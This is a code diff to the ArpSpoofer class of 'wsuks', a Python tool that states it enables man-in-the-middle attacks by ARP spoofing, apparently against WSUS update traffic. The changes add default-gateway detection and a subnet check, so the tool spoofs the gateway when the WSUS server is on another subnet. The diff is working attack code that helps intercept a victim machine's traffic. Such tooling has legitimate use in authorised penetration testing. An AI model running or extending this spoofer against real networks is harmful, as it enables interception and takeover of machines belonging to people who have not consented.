@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+from ipaddress import ip_address, IPv4Network
 import logging
 import sys
 import time
 import traceback
 import scapy.all as scapy
+from scapy.arch import get_if_addr
+import netifaces as ni
 from threading import Thread
 
 
@@ -14,8 +17,9 @@ class ArpSpoofer:
     This class is used to enable MITM attacks with ARP spoofing.
     """
 
-    def __init__(self):
+    def __init__(self, interface):
         self.logger = logging.getLogger("wsuks")
+        self.interface = interface
         self.isRunning = False
         self.targetIp = None
         self.targetMac = None
@@ -60,6 +64,47 @@ class ArpSpoofer:
             if self.logger.level == logging.DEBUG:
                 traceback.print_exc()
 
+    def get_default_gateway_ip(self, iface):
+        """
+        Returns the default gateway IP address of the specified Interface
+
+        :param iface: The interface to get the default gateway IP address from
+        :return: The default gateway IP address
+        """
+        try:
+            return [x[2] for x in scapy.conf.route.routes if x[3] == iface and x[2] != '0.0.0.0'][0]
+        except IndexError:
+            self.logger.error("Could not find default gateway IP address! Assuming now the host is the gateway.")
+            self.logger.error("This should only happen in LAB scenarios!")
+            return get_if_addr(self.interface)
+
+    def check_spoofIp_subnet(self, targetIp, spoofIp):
+        """
+        Returns the IP address to spoof.
+        If the IP address is not in the same subnet as the host, the gateway IP address is returned.
+        If the host is the gateway and the IP address to spoof is not in the same subnet, we exit as we can't spoof ourself.
+
+        :param targetIp: The victim's IP address
+        :param spoofIp: The IP address to spoof
+        """
+        net_mask = ni.ifaddresses(self.interface)[ni.AF_INET][0]['netmask']
+        interface_ip = get_if_addr(self.interface)
+        subnet = IPv4Network(interface_ip + '/' + net_mask, False)
+        gateway = self.get_default_gateway_ip(self.interface)
+
+        if ip_address(targetIp) not in subnet:
+            self.logger.critical(f"Target IP address {targetIp} is not in the same subnet as the host! Exiting...")
+            sys.exit(1)
+        elif ip_address(spoofIp) not in subnet:
+            if gateway == interface_ip:
+                self.logger.critical(f"WSUS IP address {spoofIp} is not in the same subnet and the host is the gateway!")
+                self.logger.critical("Can't arp spoof the WSUS IP address! Exiting...")
+                sys.exit(1)
+            self.logger.warning(f"WSUS IP address {spoofIp} is not in the same subnet as the host! Spoofing now the gateway IP address: {gateway}")
+            return gateway
+        else:
+            return spoofIp
+
     def start(self, targetIp, spoofIp):
         """
         Start the ARP spoofing process.
@@ -68,11 +113,11 @@ class ArpSpoofer:
         :param spoofIp: The IP address to spoof
         """
         self.targetIp = targetIp
-        self.spoofIp = spoofIp
+        self.spoofIp = self.check_spoofIp_subnet(targetIp, spoofIp)
         self.isRunning = True
 
-        self.logger.info(f"Starting ARP spoofing for target {targetIp} and spoofing IP address {spoofIp}")
-        t1 = Thread(target=self._spoof, args=(targetIp, spoofIp))
+        self.logger.info(f"Starting ARP spoofing for target {self.targetIp} and spoofing IP address {self.spoofIp}")
+        t1 = Thread(target=self._spoof, args=(self.targetIp, self.spoofIp))
         t1.start()
 
     def stop(self):
